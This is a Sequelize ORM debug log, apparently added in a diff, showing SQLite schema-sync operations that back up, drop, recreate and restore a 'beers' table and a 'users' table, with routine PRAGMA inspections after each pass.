+2025-12-18T12:41:24.975Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:24.976Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.976Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:24.976Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.988Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:24.988Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.000Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.000Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:25.000Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:25.000Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:25.011Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:25.012Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:25.012Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:25.012Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:25.013Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:25.013Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:25.013Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:25.013Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.030Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.030Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:25.032Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:25.032Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:25.048Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:25.049Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.062Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.063Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:25.063Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:25.063Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:25.075Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:25.076Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:25.076Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`beers`);
+2025-12-18T12:41:25.077Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:25.077Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:25.077Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:25.078Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`beers`)
+2025-12-18T12:41:25.078Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.091Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers_backup` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.092Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:25.093Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers_backup` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers`;
+2025-12-18T12:41:25.093Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers`;
+2025-12-18T12:41:25.109Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers`;
+2025-12-18T12:41:25.109Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.125Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `beers` (`id` INTEGER PRIMARY KEY, `name` VARCHAR(255) NOT NULL, `picture` VARCHAR(255), `price` FLOAT NOT NULL, `currency` TEXT, `stock` TEXT, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.125Z sequelize:sql:sqlite Executing (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:25.126Z sequelize:sql:sqlite Executed (default): INSERT INTO `beers` SELECT `id`, `name`, `picture`, `price`, `currency`, `stock`, `created_at`, `updated_at`, `deleted_at` FROM `beers_backup`;
+2025-12-18T12:41:25.126Z sequelize:sql:sqlite Executing (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:25.137Z sequelize:sql:sqlite Executed (default): DROP TABLE `beers_backup`;
+2025-12-18T12:41:25.138Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:25.138Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`beers`)
+2025-12-18T12:41:25.139Z sequelize:sql:sqlite Executing (default): SELECT name FROM sqlite_master WHERE type='table' AND name='users';
+2025-12-18T12:41:25.140Z sequelize:sql:sqlite Executed (default): SELECT name FROM sqlite_master WHERE type='table' AND name='users';
+2025-12-18T12:41:25.140Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.140Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.141Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.141Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.141Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.142Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.142Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.142Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.142Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.143Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.143Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.144Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.144Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.144Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.145Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.159Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.159Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.172Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.172Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.185Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.185Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.200Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.201Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.214Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.214Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.227Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.227Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.228Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.228Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.228Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.229Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.229Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.230Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.246Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.246Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.260Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.261Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.274Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.274Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.288Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.289Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.300Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.301Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.314Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.315Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.315Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.315Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.316Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.316Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.316Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.317Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.330Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.330Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.342Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.342Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.357Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.358Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.371Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.371Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.382Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.383Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.396Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.396Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.397Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.397Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.397Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.397Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.398Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.398Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.412Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.412Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.425Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.425Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.437Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.437Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.455Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.455Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.469Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.469Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.483Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.484Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.485Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.486Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.486Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.486Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.487Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.487Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.504Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users_backup` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.505Z sequelize:sql:sqlite Executing (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.519Z sequelize:sql:sqlite Executed (default): INSERT INTO `users_backup` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users`;
+2025-12-18T12:41:25.520Z sequelize:sql:sqlite Executing (default): DROP TABLE `users`;
+2025-12-18T12:41:25.533Z sequelize:sql:sqlite Executed (default): DROP TABLE `users`;
+2025-12-18T12:41:25.533Z sequelize:sql:sqlite Executing (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.548Z sequelize:sql:sqlite Executed (default): CREATE TABLE IF NOT EXISTS `users` (`id` INTEGER PRIMARY KEY, `email` VARCHAR(255) NOT NULL, `profile_pic` VARCHAR(255), `password` VARCHAR(255) NOT NULL, `role` TEXT DEFAULT 'user', `address` VARCHAR(255), `name` VARCHAR(255), `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `deleted_at` DATETIME);
+2025-12-18T12:41:25.549Z sequelize:sql:sqlite Executing (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.562Z sequelize:sql:sqlite Executed (default): INSERT INTO `users` SELECT `id`, `email`, `profile_pic`, `password`, `role`, `address`, `name`, `created_at`, `updated_at`, `deleted_at` FROM `users_backup`;
+2025-12-18T12:41:25.562Z sequelize:sql:sqlite Executing (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.575Z sequelize:sql:sqlite Executed (default): DROP TABLE `users_backup`;
+2025-12-18T12:41:25.577Z sequelize:sql:sqlite Executing (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.577Z sequelize:sql:sqlite Executed (default): PRAGMA TABLE_INFO(`users`);
+2025-12-18T12:41:25.578Z sequelize:sql:sqlite Executing (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.578Z sequelize:sql:sqlite Executed (default): PRAGMA INDEX_LIST(`users`)
+2025-12-18T12:41:25.578Z sequelize:sql:sqlite Executing (default): PRAGMA foreign_key_list(`users`)
+2025-12-18T12:41:25.578Z sequelize:sql:sqlite Executed (default): PRAGMA foreign_key_list(`users`)
